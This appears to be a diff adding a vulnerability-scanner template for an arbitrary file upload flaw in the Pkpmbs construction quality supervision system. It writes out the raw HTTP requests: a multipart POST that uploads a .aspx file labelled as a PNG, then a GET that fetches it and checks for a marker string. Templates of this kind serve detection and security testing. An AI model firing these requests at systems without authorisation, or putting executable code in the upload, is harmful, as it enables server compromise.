@@ -1,0 +1,43 @@
+id: Pkpmbs-FileUpOrDown-upload
+
+info:
+  name: Pkpmbs建设工程质量监督系统FileUpOrDown.ashx存在文件上传漏洞
+  author: Pkpmbs
+  severity: high
+  tags: Pkpmbs
+
+http:
+  - raw:
+      - |
+        POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B5sqpe6bf.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP
+        Content-Disposition: form-data; name="Filedata"; filename="5B5sqpe6bf.aspx"
+        Content-Type: image/png
+        
+        e5ba039a1ds9s9c03
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+
+      - |+
+        GET /Excel/Templete/5B5sqpe6bf.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'e5ba039a1ds9s9c03'
+    matchers-condition: and
